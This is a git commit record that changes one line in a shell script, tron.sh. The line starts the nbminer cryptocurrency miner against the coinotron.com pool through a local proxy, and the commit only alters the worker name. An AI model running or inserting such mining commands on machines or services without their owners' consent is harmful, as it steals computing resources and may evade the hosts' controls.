808f9eb9054c828e1a5684add608edca72c3b138
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-12-11 09:16:34 +0200

    Update tron.sh

--- tron.sh
+++ tron.sh
@@ -1,1 +1,1 @@
-./nbminer -a kawpow -o stratum+tcp://coinotron.com:5351 -u wotwot.nb -log --proxy 127.0.0.1:9999
+./nbminer -a kawpow -o stratum+tcp://coinotron.com:5351 -u wotwot.NB001:x -log --proxy 127.0.0.1:9999
